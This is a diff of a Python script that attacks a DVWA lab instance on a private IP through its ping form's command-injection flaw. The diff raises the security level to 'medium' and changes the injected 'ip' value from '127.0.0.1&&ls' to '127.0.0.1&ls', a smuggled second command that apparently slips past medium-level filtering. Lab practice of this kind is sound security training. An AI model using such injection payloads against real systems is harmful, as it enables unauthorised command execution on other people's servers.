@@ -19,7 +19,7 @@ res2 = requests.post(url=URL2, data=DATA2, cookies=cookies)
 """change security level"""
 URL5 = 'http://192.168.56.132/dvwa/security.php'
 DATA5 = {
-    'security': 'low',
+    'security': 'medium',
     'seclev_submit': 'Submit',
 }
 
@@ -28,7 +28,7 @@ cookies5 = res5.cookies.get_dict()
 print(cookies5)
 
 """get the correct URL page"""
-new_cookies = {'PHPSESSID': cookies['PHPSESSID'], 'security': 'low'}
+new_cookies = {'PHPSESSID': cookies['PHPSESSID'], 'security': 'medium'}
 URL3 = 'http://192.168.56.132/dvwa/vulnerabilities/exec/'
 res3 = requests.get(url=URL3, cookies=new_cookies)
 if 'Ping for FREE' in res3.text:
@@ -37,7 +37,7 @@ if 'Ping for FREE' in res3.text:
 """post the correct URL page"""
 URL4 = 'http://192.168.56.132/dvwa/vulnerabilities/exec/'
 DATA4 = {
-    'ip': '127.0.0.1&&ls',
+    'ip': '127.0.0.1&ls',
     'submit': 'submit',
 }
 sent = DATA4['ip']
